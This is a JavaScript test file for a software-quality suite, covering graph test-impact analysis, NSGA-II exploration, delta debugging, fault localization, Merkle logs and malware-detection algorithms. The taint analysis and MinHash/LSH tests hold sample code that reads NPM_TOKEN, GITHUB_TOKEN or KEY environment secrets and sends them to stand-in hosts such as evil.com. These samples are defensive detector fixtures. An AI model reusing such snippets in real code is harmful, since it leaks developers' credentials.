// Rigorous Unit and Integration Tests for SHIPPROOF Algorithmic Intelligence Suite
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  extractFileDependencies,
  extractSymbols,
  matchesCriterionPaths,
  computeGraphDistances,
  analyzeTestImpact,
} from '../server/algorithms/test-impact-graph.js';

import {
  evaluateObjectives,
  dominates,
  fastNonDominatedSort,
  calculateCrowdingDistance,
  runNSGA2Exploration,
} from '../server/algorithms/nsga2-exploration.js';

import {
  getActionCausalPrior,
  matchesSignature,
  ddmin,
  probDD,
} from '../server/algorithms/delta-debugging.js';

import {
  calculateOchiaiScore,
  calculateComparativeMetrics,
  localizeFaults,
  buildFaultRepairDossier,
} from '../server/algorithms/ochiai-localization.js';

import {
  analyzeFileTaint,
  runStaticTaintAnalysis,
} from '../server/algorithms/taint-analysis.js';

import {
  normalizeTokens,
  createShingles,
  computeMinHashSignature,
  estimateJaccardSimilarity,
  exactJaccard,
  LSHIndex,
  analyzePackageCampaigns,
} from '../server/algorithms/minhash-lsh.js';

import {
  hashLeaf,
  hashChildren,
  MerkleTransparencyLog,
} from '../server/algorithms/merkle-transparency.js';

import { createApp } from '../server/app.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

// =========================================================================
// 1. Hybrid Graph-Based Test Impact Intelligence Tests
// =========================================================================
test('Algorithm 1: extracts dependencies and symbols from JS and Python source', () => {
  const jsCode = `
    import { foo } from './utils/math.js';
    const express = require('express');
    export function calculateTotal(cart) { return 42; }
    export const applyCoupon = (code) => true;
  `;
  const jsDeps = extractFileDependencies('server/cart.js', jsCode);
  assert.ok(jsDeps.includes('./utils/math.js'));
  assert.ok(jsDeps.includes('express'));

  const jsSymbols = extractSymbols('server/cart.js', jsCode);
  assert.ok(jsSymbols.some((s) => s.name === 'calculateTotal'));
  assert.ok(jsSymbols.some((s) => s.name === 'applyCoupon'));

  const pyCode = `
    from models.evaluator import Superoptimizer
    import torch
    def optimize_kernel(block):
        pass
  `;
  const pyDeps = extractFileDependencies('pt/opt.py', pyCode);
  assert.ok(pyDeps.some((d) => d.includes('models/evaluator')));
  const pySymbols = extractSymbols('pt/opt.py', pyCode);
  assert.ok(pySymbols.some((s) => s.name === 'optimize_kernel'));
});

test('Algorithm 1: path matching and graph distance calculation', () => {
  assert.equal(matchesCriterionPaths('server/cart.js', ['server/**', 'public/*']), true);
  assert.equal(matchesCriterionPaths('docs/README.md', ['server/**', 'public/*']), false);

  const mockGraph = {
    nodes: new Map(),
    adjacency: new Map([
      ['server/cart.js', new Set(['server/discount.js'])],
      ['server/discount.js', new Set(['server/tokens.js'])],
    ]),
    reverseAdjacency: new Map([
      ['server/discount.js', new Set(['server/cart.js'])],
      ['server/tokens.js', new Set(['server/discount.js'])],
    ]),
  };

  const { distances } = computeGraphDistances(mockGraph, ['server/cart.js']);
  assert.equal(distances.get('server/cart.js'), 0);
  assert.equal(distances.get('server/discount.js'), 1);
  assert.equal(distances.get('server/tokens.js'), 2);
});

test('Algorithm 1: end-to-end impact analysis with structural and budget ranking', () => {
  const criteria = [
    { id: 'crit-1', text: 'Cart discount checkout', paths: ['server/discount.js'], priority: 'critical' },
    { id: 'crit-2', text: 'User profile avatar', paths: ['public/profile.js'], priority: 'low' },
    { id: 'crit-3', text: 'Token refresh flow', paths: ['server/tokens.js'], priority: 'high' },
  ];

  const result = analyzeTestImpact({
    workspaceRoot: ROOT,
    changedFiles: ['server/discount.js'],
    criteria,
    budget: { maxTests: 2, timeBudgetMs: 10000 },
  });

  assert.equal(result.totalCriteria, 3);
  assert.ok(result.selectedCount <= 2);
  const selected = result.results.filter((r) => r.selected);
  assert.ok(selected.length >= 1);
  assert.equal(selected[0].criterionId, 'crit-1');
  assert.equal(selected[0].distance, 0);
  assert.ok(selected[0].reason.includes('Direct match'));
});

// =========================================================================
// 2. NSGA-II Multi-Objective Automated Exploration Tests
// =========================================================================
test('Algorithm 2: multi-objective evaluation and Pareto dominance check', () => {
  const seqA = [
    { type: 'NAVIGATE', url: '/' },
    { type: 'CLICK', selector: '#add-to-cart' },
    { type: 'CLICK', selector: '.checkout-btn' },
    { type: 'TYPE', selector: 'input[name="coupon"]', text: 'PROMO_99' },
  ];
  const objA = evaluateObjectives(seqA);
  assert.ok(objA.stateCoverage >= 3);
  assert.ok(objA.diversity > 0);
  assert.ok(objA.defectPotential >= 1.5);
  assert.equal(objA.actionCount, 4);

  const indA = {
    objectives: { stateCoverage: 10, diversity: 1.5, defectPotential: 5.0, actionCount: 5 },
  };
  const indB = {
    objectives: { stateCoverage: 5, diversity: 1.0, defectPotential: 2.0, actionCount: 10 },
  };
  const indC = {
    objectives: { stateCoverage: 12, diversity: 0.8, defectPotential: 6.0, actionCount: 6 },
  };

  assert.equal(dominates(indA, indB), true);
  assert.equal(dominates(indB, indA), false);
  assert.equal(dominates(indA, indC), false); // trade-off in diversity and count
});

test('Algorithm 2: fast non-dominated sorting and NSGA-II evolution', () => {
  const population = [
    { id: 1, objectives: { stateCoverage: 10, diversity: 1.5, defectPotential: 5.0, actionCount: 5 } },
    { id: 2, objectives: { stateCoverage: 4, diversity: 0.5, defectPotential: 1.0, actionCount: 8 } },
    { id: 3, objectives: { stateCoverage: 12, diversity: 1.8, defectPotential: 6.0, actionCount: 4 } },
  ];

  const fronts = fastNonDominatedSort(population);
  assert.ok(fronts.length >= 2);
  assert.ok(fronts[0].some((ind) => ind.id === 3)); // Individual 3 dominates others

  const result = runNSGA2Exploration({
    populationSize: 10,
    generations: 4,
    routes: ['/', '/cart', '/checkout'],
  });

  assert.equal(result.generationsCompleted, 4);
  assert.ok(result.frontier.length > 0);
  assert.ok(result.frontier[0].sequence.length > 0);
});

// =========================================================================
// 3. Probabilistic Delta Debugging Tests
// =========================================================================
test('Algorithm 3: causal priors and signature matching', () => {
  assert.ok(getActionCausalPrior({ type: 'TYPE' }) > getActionCausalPrior({ type: 'WAIT' }));
  assert.ok(getActionCausalPrior({ type: 'CLICK', selector: '.checkout-btn' }) > getActionCausalPrior({ type: 'NAVIGATE' }));

  const outcome = { verdict: 'FAIL', error: 'Discount validation error code 422' };
  assert.equal(matchesSignature(outcome, '422'), true);
  assert.equal(matchesSignature(outcome, '500 Internal Error'), false);
});

test('Algorithm 3: ddmin and ProbDD reduce failing sequence to 1-minimal reproduction', async () => {
  // Sequence of 8 actions; failure occurs ONLY when step 2 (TYPE coupon) and step 5 (CLICK checkout) are both present
  const fullSequence = [
    { type: 'NAVIGATE', url: '/' },
    { type: 'WAIT', durationMs: 100 },
    { type: 'TYPE', selector: '#coupon', text: 'SAVE20' }, // causal
    { type: 'WAIT', durationMs: 250 },
    { type: 'CLICK', selector: '#banner-ad' }, // noise
    { type: 'CLICK', selector: '#checkout' }, // causal
    { type: 'WAIT', durationMs: 100 },
    { type: 'ASSERT', selector: '.footer', condition: 'visible' },
  ];

  const oracle = async (seq) => {
    const hasCoupon = seq.some((a) => a.type === 'TYPE' && a.text === 'SAVE20');
    const hasCheckout = seq.some((a) => a.type === 'CLICK' && a.selector === '#checkout');
    if (hasCoupon && hasCheckout) {
      return { verdict: 'FAIL', error: 'Coupon calculation overflow' };
    }
    return { verdict: 'PASS' };
  };

  // Test ddmin
  const ddResult = await ddmin({
    sequence: fullSequence,
    oracle,
    expectedSignature: 'Coupon calculation overflow',
  });

  assert.equal(ddResult.status, 'SUCCESS');
  assert.equal(ddResult.reducedLength, 2);
  assert.ok(ddResult.reductionRatio >= 0.75);

  // Test ProbDD
  const probResult = await probDD({
    sequence: fullSequence,
    oracle,
    expectedSignature: 'Coupon calculation overflow',
  });

  assert.equal(probResult.status, 'SUCCESS');
  assert.equal(probResult.reducedLength, 2);
  assert.ok(probResult.evaluations > 0);
  assert.equal(probResult.isOneMinimal, true);
});

// =========================================================================
// 4. Ochiai Spectrum-Based Fault Localization Tests
// =========================================================================
test('Algorithm 4: mathematical correctness of Ochiai, Tarantula, and DStar coefficients', () => {
  // Component executed in 3 out of 4 failed tests, and 1 out of 6 passed tests
  // n_ef = 3, n_ep = 1, n_f = 4, n_p = 6
  // Ochiai = 3 / sqrt(4 * (3 + 1)) = 3 / sqrt(16) = 3 / 4 = 0.75
  const score = calculateOchiaiScore(3, 1, 4, 6);
  assert.equal(score, 0.75);

  const comparative = calculateComparativeMetrics(3, 1, 4, 6);
  assert.ok(comparative.tarantula > 0);
  assert.ok(comparative.dstar > 0);
});

test('Algorithm 4: localizes buggy file from execution spectrum matrix and creates repair dossier', () => {
  const executions = [
    { testId: 'test-1', outcome: 'FAIL', coverage: ['server/app.js', 'server/discount.js', 'server/utils.js'] },
    { testId: 'test-2', outcome: 'FAIL', coverage: ['server/discount.js', 'server/db.js'] },
    { testId: 'test-3', outcome: 'FAIL', coverage: ['server/discount.js', 'server/tokens.js'] },
    { testId: 'test-4', outcome: 'PASS', coverage: ['server/app.js', 'server/utils.js'] },
    { testId: 'test-5', outcome: 'PASS', coverage: ['server/db.js', 'server/tokens.js'] },
    { testId: 'test-6', outcome: 'PASS', coverage: ['server/app.js', 'server/db.js'] },
  ];

  const localization = localizeFaults({ executions });
  assert.equal(localization.totalFailedTests, 3);
  assert.equal(localization.totalPassedTests, 3);

  // server/discount.js was executed in ALL 3 failing tests and ZERO passing tests -> Ochiai score should be 1.0!
  const topCandidate = localization.topSuspicious[0];
  assert.equal(topCandidate.component, 'server/discount.js');
  assert.equal(topCandidate.ochiaiScore, 1.0);
  assert.equal(topCandidate.suspicionLevel, 'CRITICAL');

  const criteria = [{ id: 'test-1', text: 'Discount calculation' }];
  const dossier = buildFaultRepairDossier({ localizationResult: localization, criteria });
  assert.equal(dossier.status, 'FAULT_LOCALIZED');
  assert.equal(dossier.primaryFaultCandidate, 'server/discount.js');
});

// =========================================================================
// 5. Interprocedural Static Taint Analysis Tests
// =========================================================================
test('Algorithm 5: detects direct and multi-step taint flows from env to network/exec sinks', () => {
  const maliciousCode = `
    const secret = process.env.NPM_TOKEN;
    const authHeader = 'Bearer ' + secret;
    const payload = { token: authHeader };
    fetch('https://malicious-exfiltrator.test/collect', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
  `;

  const { taintFlows } = analyzeFileTaint('install.js', maliciousCode);
  assert.ok(taintFlows.length >= 1);
  const flow = taintFlows[0];
  assert.equal(flow.source.type, 'env');
  assert.equal(flow.sink.type, 'network');
  assert.equal(flow.severity, 'CRITICAL');
  assert.ok(flow.steps.some((s) => s.includes('NPM_TOKEN')));
});

// =========================================================================
// 6. MinHash & LSH Campaign Detection Tests
// =========================================================================
test('Algorithm 6: token normalization, shingling, and MinHash Jaccard similarity', () => {
  const originalCode = `
    function stealData(target) {
      const token = process.env.GITHUB_TOKEN;
      fetch('https://evil.org', { body: token });
    }
  `;
  // Attacker renames variables target->victim, token->t, changes indentation
  const obfuscatedCode = `
    function stealData(victim) {
      let t = process.env.GITHUB_TOKEN;
      fetch('https://evil.org', { body: t });
    }
  `;
  const benignCode = `
    class ReactComponent {
      render() {
        return <div>Hello World</div>;
      }
    }
  `;

  const tokensA = normalizeTokens(originalCode);
  const tokensB = normalizeTokens(obfuscatedCode);
  const tokensC = normalizeTokens(benignCode);

  const shinglesA = createShingles(tokensA, 4);
  const shinglesB = createShingles(tokensB, 4);
  const shinglesC = createShingles(tokensC, 4);

  const sigA = computeMinHashSignature(shinglesA);
  const sigB = computeMinHashSignature(shinglesB);
  const sigC = computeMinHashSignature(shinglesC);

  const simAB = estimateJaccardSimilarity(sigA, sigB);
  const simAC = estimateJaccardSimilarity(sigA, sigC);

  // Near-duplicates should have high similarity, benign should have near-zero
  assert.ok(simAB >= 0.55, `Expected high similarity between obfuscated variants, got ${simAB}`);
  assert.ok(simAC <= 0.20, `Expected low similarity between unrelated code, got ${simAC}`);
});

test('Algorithm 6: LSH Index clusters typosquatted packages into campaign families', () => {
  const packages = [
    { name: 'cross-env-security', code: 'function p() { const x = process.env.KEY; fetch("evil.com", { body: x }); }' },
    { name: 'cross-env-utils', code: 'function p() { const token = process.env.KEY; fetch("evil.com", { body: token }); }' },
    { name: 'cross-env-fixed', code: 'function p() { const secret = process.env.KEY; fetch("evil.com", { body: secret }); }' },
    { name: 'lodash-safe', code: 'export function chunk(arr, n) { return [arr.slice(0, n)]; }' },
  ];

  const result = analyzePackageCampaigns(packages, 0.70);
  assert.equal(result.totalPackagesIndexed, 4);
  assert.equal(result.clustersFound, 1);
  const campaign = result.campaigns[0];
  assert.equal(campaign.clusterSize, 3);
  assert.ok(campaign.packages.some((p) => p.name === 'cross-env-security'));
  assert.ok(campaign.packages.some((p) => p.name === 'cross-env-utils'));
  assert.ok(campaign.packages.some((p) => p.name === 'cross-env-fixed'));
});

// =========================================================================
// 7. Merkle-Based Evidence Transparency Log (RFC 9162) Tests
// =========================================================================
test('Algorithm 7: domain-separated leaf and node hashing', () => {
  const h1 = hashLeaf('evidence-payload-1');
  const h2 = hashLeaf('evidence-payload-2');
  const parent = hashChildren(h1, h2);

  assert.equal(typeof h1, 'string');
  assert.equal(h1.length, 64);
  assert.notEqual(h1, h2);
  assert.notEqual(parent, h1);
});

test('Algorithm 7: append-only log, inclusion proof generation, and verification', () => {
  const log = new MerkleTransparencyLog();
  const leaf1 = log.append({ runId: 'run-01', exitCode: 0, status: 'passed' });
  const leaf2 = log.append({ runId: 'run-02', exitCode: 1, status: 'failed' });
  const leaf3 = log.append({ runId: 'run-03', exitCode: 0, status: 'passed' });
  const leaf4 = log.append({ runId: 'run-04', exitCode: 0, status: 'passed' });

  assert.equal(log.size, 4);
  const sth = log.getSignedTreeHead();
  assert.equal(sth.treeSize, 4);

  // Generate inclusion proof for leaf 1 (index 1)
  const proof = log.getInclusionProof(1);
  assert.equal(proof.leafIndex, 1);
  assert.equal(proof.treeSize, 4);

  // Cryptographic audit verification
  const isValid = MerkleTransparencyLog.verifyInclusionProof(proof);
  assert.equal(isValid, true);

  // Tamper check: alter leaf hash or sibling hash
  const tamperedProof = { ...proof, leafHash: '0000000000000000000000000000000000000000000000000000000000000000' };
  const isTamperedValid = MerkleTransparencyLog.verifyInclusionProof(tamperedProof);
  assert.equal(isTamperedValid, false);

  // Consistency proof
  const consistency = log.getConsistencyProof(2);
  assert.equal(consistency.firstSize, 2);
  assert.equal(consistency.secondSize, 4);
  assert.equal(MerkleTransparencyLog.verifyConsistencyProof(consistency), true);
});

// =========================================================================
// 8. Integration Test: Express REST API Endpoints
// =========================================================================
test('Algorithm REST API: exposes all 7 algorithmic engines through HTTP endpoints', async () => {
  const testDataDir = path.join(ROOT, 'data', 'test-algo-temp-' + Date.now());
  const { app, db, shutdown } = createApp({ dataDir: testDataDir });

  try {
    // Seed test project & criterion
    const userRes = db.run('INSERT INTO users (email, name, pass_hash, created_at) VALUES (?, ?, ?, ?)', 'algo@shipproof.test', 'Algo Tester', 'hash', new Date().toISOString());
    const userId = Number(userRes.lastInsertRowid);
    const projRes = db.run('INSERT INTO projects (user_id, name, app_url, created_at) VALUES (?, ?, ?, ?)', userId, 'Algo Demo', 'http://127.0.0.1:3000', new Date().toISOString());
    const projectId = String(projRes.lastInsertRowid);

    db.run(
      'INSERT INTO criteria (project_id, key, text, category, paths, criticality, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
      Number(projectId),
      'C1',
      'Test shopping cart checkout with discount',
      'functional',
      JSON.stringify(['server/discount.js']),
      'critical',
      new Date().toISOString(),
      new Date().toISOString()
    );

    // Dynamic import supertest or native fetch with listening server
    const server = app.listen(0);
    const port = server.address().port;
    const base = `http://127.0.0.1:${port}/api/algorithms`;

    // 1. POST /impact/analyze
    const impactRes = await fetch(`${base}/impact/analyze`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        projectId,
        changedFiles: ['server/discount.js'],
        budget: { maxTests: 5 },
      }),
    });
    assert.equal(impactRes.status, 200);
    const impactJson = await impactRes.json();
    assert.ok(impactJson.selectedCount >= 1);

    // 2. POST /nsga2/explore
    const nsgaRes = await fetch(`${base}/nsga2/explore`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        projectId,
        populationSize: 8,
        generations: 3,
      }),
    });
    assert.equal(nsgaRes.status, 200);
    const nsgaJson = await nsgaRes.json();
    assert.ok(nsgaJson.frontier.length > 0);

    // 3. POST /ddmin/reduce
    const ddRes = await fetch(`${base}/ddmin/reduce`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        projectId,
        sequence: [
          { type: 'NAVIGATE', url: '/' },
          { type: 'WAIT', durationMs: 100 },
          { type: 'CLICK', selector: '#checkout' },
          { type: 'WAIT', durationMs: 200 },
        ],
        expectedSignature: 'checkout discount',
      }),
    });
    assert.equal(ddRes.status, 200);
    const ddJson = await ddRes.json();
    assert.ok(ddJson.reducedLength <= 4);

    // 4. POST /sbfl/localize
    const sbflRes = await fetch(`${base}/sbfl/localize`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ projectId }),
    });
    assert.equal(sbflRes.status, 200);
    const sbflJson = await sbflRes.json();
    assert.equal(sbflJson.repairDossier.status, 'FAULT_LOCALIZED');

    // 5. POST /transparency/append and /proof
    const appendRes = await fetch(`${base}/transparency/append`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ evidenceData: { testRun: 'test-evidence-01', exitCode: 0 } }),
    });
    assert.equal(appendRes.status, 200);
    const appendJson = await appendRes.json();
    assert.ok(appendJson.signedTreeHead);

    const proofRes = await fetch(`${base}/transparency/proof`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ leafIndex: appendJson.index }),
    });
    assert.equal(proofRes.status, 200);
    const proofJson = await proofRes.json();
    assert.equal(proofJson.verified, true);

    // 6. GET /overview/:projectId
    const overviewRes = await fetch(`${base}/overview/${projectId}`);
    assert.equal(overviewRes.status, 200);
    const overviewJson = await overviewRes.json();
    assert.ok(overviewJson.impactAnalysis);
    assert.ok(overviewJson.faultLocalization);
    assert.ok(overviewJson.merkleHead);

    server.close();
  } finally {
    await shutdown();
    try {
      fs.rmSync(testDataDir, { recursive: true, force: true });
    } catch {}
  }
});
